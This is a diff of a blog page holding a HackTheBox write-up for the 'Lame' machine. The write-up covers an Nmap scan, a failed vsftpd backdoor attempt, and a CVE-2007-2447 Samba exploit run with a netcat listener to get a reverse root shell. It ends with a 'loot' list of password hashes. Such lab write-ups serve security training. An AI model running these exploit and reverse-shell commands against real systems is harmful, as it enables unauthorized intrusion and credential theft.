@@ -1,46 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>Mannthan</title>
-    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
-    <script src="/static/js/highlight.min.js"></script>
-    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
-    <link rel="stylesheet" href="/static/css/github-gist.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
-   </head>
-  <body>
-    <div class="header">
-      <table>
-        <tr>
-          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
-          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
-          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
-          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
-        </tr>
-      </table>
-    </div>
-    <div class="body">
-          <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Lame</h1>
-                  <p><a href="/posts/20191029_vulnhub-lazysysadmin1.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-legacy.html"> » </a></p>
-                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested"><img alt="writeup.metadata.infocard" src="/static/files/posts_htb_lame/infocard.png" /></p>
-<p class="nested">This is a writeup for HTB VM <a href="htps://www.hackthebox.eu/home/machines/profile/1">Lame</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_lame/killchain.png" /></p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[HackTheBox] Lame</h1><p><a href=/posts/20191029_vulnhub-lazysysadmin1.html> « </a>📅 published on <code>01/Nov/2019</code><a href=/posts/20191101_htb-legacy.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested><img alt=writeup.metadata.infocard src=/static/files/posts_htb_lame/infocard.png></p><p class=nested>This is a writeup for HTB VM <a href=htps://www.hackthebox.eu/home/machines/profile/1>Lame</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_htb_lame/killchain.png></p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
 Nmap scan report for 10.10.10.3
 Host is up, received user-set (0.26s latency).
 Scanned at 2019-11-01 12:30:13 PDT for 94s
@@ -91,49 +49,23 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Nov  1 12:31:47 2019 -- 1 IP address (1 host up) scanned in 93.91 seconds
-</code></pre>
-
-<p class="nested">2. We find that the <code>vsftpd</code> service allows anonymous logins and as such connect to it but don't find anything inetresting there. We however find a MSF exploit for the <code>vsftpd</code> version <code>2.3.4</code>. This exploit failed to obtain a session:  </p>
-<pre class="nested"><code>ftp 10.10.10.3
+</code></pre><p class=nested>2. We find that the <code>vsftpd</code> service allows anonymous logins and as such connect to it but don't find anything inetresting there. We however find a MSF exploit for the <code>vsftpd</code> version <code>2.3.4</code>. This exploit failed to obtain a session: </p><pre class=nested><code>ftp 10.10.10.3
 msfconsole
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOST 10.10.10.3
   show options
   exploit
-</code></pre>
-
-<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_lame/screenshot01.png" />  </p>
-<p class="nested"><img alt="writeup.enumeration.steps.2.2" src="/static/files/posts_htb_lame/screenshot02.png" />  </p>
-<p class="nested">3. We then explore the open (read+write) SMB share <code>tmp</code> but since there is no service (like HTTP for example) to leverage uploaded files, we move on:  </p>
-<pre class="nested"><code>smbclient \\\\10.10.10.3\\tmp
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_htb_lame/screenshot01.png> </p><p class=nested><img alt=writeup.enumeration.steps.2.2 src=/static/files/posts_htb_lame/screenshot02.png> </p><p class=nested>3. We then explore the open (read+write) SMB share <code>tmp</code> but since there is no service (like HTTP for example) to leverage uploaded files, we move on: </p><pre class=nested><code>smbclient \\\\10.10.10.3\\tmp
   dir
-</code></pre>
-
-<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_lame/screenshot03.png" />  </p>
-<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>21/tcp   |  ftp          |  vsftpd 2.3.4
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_htb_lame/screenshot03.png> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>21/tcp   |  ftp          |  vsftpd 2.3.4
 22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  |  netbios-ssn  |  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. From the Nmap scan results we know that the SMB service version is <code>3.0.20-Debian</code> and upon searching for this version we come across the popular <code>usermap_script</code> exploit. There's a <a href="https://github.com/amriunix/CVE-2007-2447">Python script</a> for this exploit on GitHub. We follow the exploit instructions and gain a shell with elevated privileges on the target system:  </p>
-<pre class="nested"><code>nc -nlvp 443
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. From the Nmap scan results we know that the SMB service version is <code>3.0.20-Debian</code> and upon searching for this version we come across the popular <code>usermap_script</code> exploit. There's a <a href=https://github.com/amriunix/CVE-2007-2447>Python script</a> for this exploit on GitHub. We follow the exploit instructions and gain a shell with elevated privileges on the target system: </p><pre class=nested><code>nc -nlvp 443
 python usermap_script.py 10.10.10.3 139 10.10.14.18 443
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_lame/screenshot04.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_lame/screenshot05.png" />  </p>
-<p class="nested">2. We then read the contents of both <code>user.txt</code> and <code>root.txt</code> files to complete the challenge:  </p>
-<pre class="nested"><code>cat /home/makis/user.txt
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_htb_lame/screenshot04.png> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_htb_lame/screenshot05.png> </p><p class=nested>2. We then read the contents of both <code>user.txt</code> and <code>root.txt</code> files to complete the challenge: </p><pre class=nested><code>cat /home/makis/user.txt
 cat /root/root.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_lame/screenshot06.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>root@lame&gt; id
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_htb_lame/screenshot06.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>root@lame&gt; id
 uid=0(root) gid=0(root)
 root@lame&gt;  
 root@lame&gt; uname
@@ -154,61 +86,12 @@ root@lame&gt;
 root@lame&gt; users
 root
 makis
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
-<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<pre class="nested"><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:............
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:............
 sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0...........
 klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:............
 postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:............
 service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:............
 makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:............
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<pre class="nested"><code>/home/makis/user.txt: 69454a937d94f5f0225ea...........
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>/home/makis/user.txt: 69454a937d94f5f0225ea...........
 /root/root.txt: 92caac3be140ef409e4572..........
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
-<li><a href="https://www.hackthebox.eu/home/machines/profile/1">https://www.hackthebox.eu/home/machines/profile/1</a>  </li>
-<li><a href="https://hackingresources.com/lame-hackthebox-walkthrough/">https://hackingresources.com/lame-hackthebox-walkthrough/</a>  </li>
-</ul>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p style="text-align:center;">« <a href="/posts/20191029_vulnhub-lazysysadmin1.html">[VulnHub] LazySysAdmin: 1...</a> « | » <a href="/posts/20191101_htb-legacy.html">[HackTheBox] Legacy...</a> »</p>
-            </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(elem) {
-        elem.classList.toggle("expanded");
-        var ish2=false; var ish3=false; var ish4=false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
-        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
-        var sibling = elem.nextElementSibling;
-        while (sibling) {
-          if (ish2 && sibling.classList.contains("h2")) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (sibling.classList.contains("collapsible")) {
-            sibling.classList.toggle("expanded");
-          }
-          sibling.classList.toggle("active");
-          sibling = sibling.nextElementSibling;
-        }
-      }
-    </script>
-    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
-  </body>
-</html>
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.hackthebox.eu/home/machines/profile/1>https://www.hackthebox.eu/home/machines/profile/1</a> </li><li><a href=https://hackingresources.com/lame-hackthebox-walkthrough/ >https://hackingresources.com/lame-hackthebox-walkthrough/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191029_vulnhub-lazysysadmin1.html>[VulnHub] LazySysAdmin: 1...</a> « | » <a href=/posts/20191101_htb-legacy.html>[HackTheBox] Legacy...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>
